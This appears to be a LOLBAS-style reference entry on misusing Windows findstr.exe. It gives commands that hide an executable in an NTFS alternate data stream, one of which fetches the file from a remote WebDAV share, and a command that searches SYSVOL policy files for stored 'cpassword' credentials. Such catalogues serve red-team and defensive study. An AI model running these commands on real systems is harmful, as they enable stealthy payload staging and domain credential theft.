## Findstr.exe

* Functions: Add ADS, Search

```
findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe    

findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe    

findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
```

Acknowledgements:
* Oddvar Moe - @oddvarmoe

Code sample:
* 

Resources:
* https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
* https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f

Full path:
```
c:\windows\system32\findstr.exe
c:\windows\sysWOW64\findstr.exe
```

Notes:
Some specific details about the binary file.


 
